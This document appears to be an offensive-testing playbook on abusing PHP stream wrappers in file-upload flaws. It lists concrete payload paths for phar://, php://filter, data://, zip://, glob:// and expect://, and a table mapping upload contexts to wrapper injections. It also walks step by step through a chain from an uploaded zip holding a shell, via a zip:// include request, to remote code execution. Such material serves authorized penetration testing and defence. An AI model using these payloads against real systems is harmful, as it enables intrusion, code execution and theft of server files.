# PHP Wrappers in Upload Paths — `phar://`, `php://`, `data://`, `glob://`

## The wrapper toolbox — when a path you control is fed to a file-op

Upload work intersects wrappers at two points: the file lands somewhere a
wrapper path reaches it, OR the upload *endpoint itself* takes a
wrapper-shaped `path`/`url`.

## `phar://` — the deser wrapper

`phar://uploads/x.phar/inner` — full depth in `phar-format-deep.md`.
Upload-side notes: no `.phar` ext needed; triggers on any file-op.

## `php://filter` — read transforms that hit stored files

`php://filter/convert.base64-encode/resource=uploads/x.php` — the stored
file's source back out through a download/read endpoint. Upload a
`phar`/`shell` file then read it via filter — or chain filter→include.

Write-side filters: `php://filter/write=convert.base64-decode/resource=...`
rarely exposed.

## `data://` — `data:text/plain;base64,<b64>` as a path

`include 'data://text/plain;base64,PD9waHA...'` — requires
`allow_url_include=1` — turns an include primitive into upload-free exec.
Related: `input`/`php://input` bodies.

## `zip://`/`phar://`/`rar://` — archive-inner includes

`zip://uploads/x.zip#inner.php` — an uploaded zip whose inner file is a
shell. The file lands via normal image/document upload validation (it IS
a valid zip) — the exec comes via the `zip://` include path.

```
zip://uploads/x.zip#shell.php
phar://uploads/x.zip/inner.php       — phar reads zip-ish? no — zip:// only
phar://uploads/x.phar/inner.php
```

## `glob://` — directory listing via wrapper

`glob://uploads/*.php` — a `DirectoryIterator`/glob call on a controlled
path leaks names — the file DISCOVERY leg for hashed/renamed uploads.

## `expect://` — `expect://id` — direct exec

Dead unless the `expect` PECL is loaded — grep `extension=expect` /
`expect://` support. `expect://id` in an include/exec path runs the
command.

## `ssh2://`, `ftp://`, `ogg://`, `rar://`, `compress.*` — the long tail

Only when the extension is loaded — check `phpinfo`/source. `ftp://`/`ssh2`
on include paths reaches out — SSRF-adjacent.

## The upload-connection — where these matter

| Upload context | Wrapper angle |
|---|---|
| file lands, need exec | `include zip://x.zip#inner` / `phar://x/inner` |
| validator demands a real zip/image | upload IS the polyglot |
| a `read`/`download`/`page` endpoint takes a path | `php://filter`, `phar://`, `data://` on the uploaded file |
| name/path fields take any string | inject the wrapper into the path arg |
| importer reads `url`/`src` fields | wrapper into the url field |

## The `include` chain — upload → wrapper → RCE

```
upload x.zip containing inner.php   → lands as uploads/x.zip
GET /page.php?f=zip://uploads/x.zip%23inner.php
                                    → executes inner.php
```

`#` must be urlencoded `%23` in the URL.

## Falsifiers

- no file-op on the server takes a path you control
- wrappers disabled (`allow_url_include=0` kills data:// and remote;
  phar ext missing kills phar://)

## Output to record

- the endpoint + the wrapper path that fired
- the verbatim output proving exec/deser
